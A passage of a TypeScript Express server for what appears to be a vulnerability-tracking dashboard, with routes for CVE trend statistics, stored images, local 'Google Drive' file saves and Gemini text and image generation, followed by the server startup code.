    "2026": { cves: 48900, malware: 35600, cisaKev: 1780, crit: 9240 },
  };

  // Re-tally with any live local entries
  for (const c of merged) {
    const y = String(c.year || 2026);
    if (byYear[y]) {
      if (c.cisaKev) byYear[y].cisaKev++;
      if ((c.score || 0) >= 9.0) byYear[y].crit++;
    }
  }

  res.json({
    ok: true,
    years: ["2020", "2021", "2022", "2023", "2024", "2025", "2026"],
    trends: byYear,
    totalIndexed: merged.length,
    cisaSource: "https://www.cisa.gov/known-exploited-vulnerabilities-catalog",
  });
});

// ============================================================================
// 6. IMAGE STORAGE & GOOGLE DRIVE SYNC ROUTES
// ============================================================================
app.get("/api/admin/images", (_req: Request, res: Response) => {
  const images = readJsonFile<any[]>(STORED_IMAGES_PATH, []);
  res.json({ ok: true, images });
});

app.post("/api/admin/images/save", (req: Request, res: Response) => {
  const { name, sizeBytes, width, height, dataUrl } = req.body || {};
  const images = readJsonFile<any[]>(STORED_IMAGES_PATH, []);
  const newImg = {
    id: `img-${Date.now()}`,
    name: name || "capture.png",
    sizeBytes: sizeBytes || 0,
    width: width || 800,
    height: height || 600,
    dataUrl: dataUrl || "",
    createdAt: Date.now(),
  };
  images.unshift(newImg);
  writeJsonFile(STORED_IMAGES_PATH, images);
  res.json({ ok: true, image: newImg, images });
});

app.post("/api/admin/images/delete", (req: Request, res: Response) => {
  const { id } = req.body || {};
  const images = readJsonFile<any[]>(STORED_IMAGES_PATH, []).filter((img) => img.id !== id);
  writeJsonFile(STORED_IMAGES_PATH, images);
  res.json({ ok: true, images });
});

app.post("/api/gdrive/save", (req: Request, res: Response) => {
  const { title, content } = req.body || {};
  const safeTitle = String(title || "brainvault-dossier")
    .toLowerCase()
    .replace(/[^a-z0-9-_]+/g, "-")
    .slice(0, 60);
  const filename = `${safeTitle}-${Date.now()}.html`;
  const filePath = path.join(GDRIVE_SYNC_DIR, filename);
  try {
    fs.writeFileSync(filePath, String(content || ""), "utf-8");
  } catch (_) {}
  res.json({ ok: true, filename, path: `/data/cloud_gdrive_sync/${filename}` });
});

// ============================================================================
// 7. GEMINI AI GENERATION ROUTES (/api/generate & /api/generate-image)
// ============================================================================
let aiClient: GoogleGenAI | null = null;
function getAIClient(): GoogleGenAI {
  if (!aiClient) {
    const apiKey = process.env.GEMINI_API_KEY;
    if (!apiKey) {
      throw new Error("GEMINI_API_KEY environment variable is not set.");
    }
    aiClient = new GoogleGenAI({ apiKey });
  }
  return aiClient;
}

app.post("/api/generate", async (req: Request, res: Response) => {
  try {
    const { prompt, systemInstruction } = req.body;
    if (!prompt || typeof prompt !== "string") {
      return res.status(400).json({ error: "A valid prompt string is required." });
    }
    const ai = getAIClient();
    const response = await ai.models.generateContent({
      model: "gemini-3-flash-preview",
      contents: prompt,
      config: systemInstruction ? { systemInstruction } : undefined,
    });
    res.json({ text: response.text });
  } catch (error) {
    console.error("Error generating content:", error);
    res.status(500).json({
      error: error instanceof Error ? error.message : "Failed to generate content",
    });
  }
});

app.post("/api/generate-image", async (req: Request, res: Response) => {
  try {
    const { prompt } = req.body;
    if (!prompt || typeof prompt !== "string") {
      return res.status(400).json({ error: "A valid prompt string is required." });
    }
    const ai = getAIClient();
    const response = await ai.models.generateContent({
      model: "gemini-2.5-flash-image",
      contents: {
        parts: [{ text: prompt }],
      },
      config: {
        imageConfig: {
          aspectRatio: "16:9",
        },
      },
    });

    let imageUrl: string | null = null;
    if (response.candidates && response.candidates.length > 0) {
      const parts = response.candidates[0].content?.parts || [];
      for (const part of parts) {
        if (part.inlineData) {
          const base64EncodeString = part.inlineData.data;
          const mimeType = part.inlineData.mimeType || "image/png";
          imageUrl = `data:${mimeType};base64,${base64EncodeString}`;
          break;
        }
      }
    }

    if (!imageUrl) {
      return res.status(500).json({ error: "No image was generated." });
    }

    res.json({ imageUrl });
  } catch (error) {
    console.error("Error generating image:", error);
    res.status(500).json({
      error: error instanceof Error ? error.message : "Failed to generate image",
    });
  }
});

// Catch any unmatched /api/* routes so they return JSON instead of HTML
app.all("/api/*", (req: Request, res: Response) => {
  res.status(404).json({ error: `API endpoint not found: ${req.method} ${req.path}` });
});

async function startServer() {
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (_req: Request, res: Response) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
